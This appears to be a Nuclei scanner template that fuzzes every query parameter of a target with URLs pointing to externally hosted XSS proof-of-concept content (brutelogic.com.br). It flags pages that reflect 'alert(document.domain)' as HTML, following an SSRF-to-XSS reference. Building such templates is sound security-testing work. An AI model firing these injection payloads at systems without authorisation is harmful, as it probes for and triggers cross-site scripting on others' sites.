http:
- fuzzing:
  - fuzz:
    - '{{logic}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - type: word
    words:
    - alert(document.domain)
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    logic:
    - http://brutelogic.com.br/poc.svg
    - http://brutelogic.com.br/2
    - 12:3@brutelogic.com.br/2
  redirects: true
  stop-at-first-match: true
id: brutelogic-xss
info:
  author: reewardius
  name: Brutelogic XSS
  reference: https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158
  severity: medium
  tags: fuzzing-xss,fuzzing-req,dast
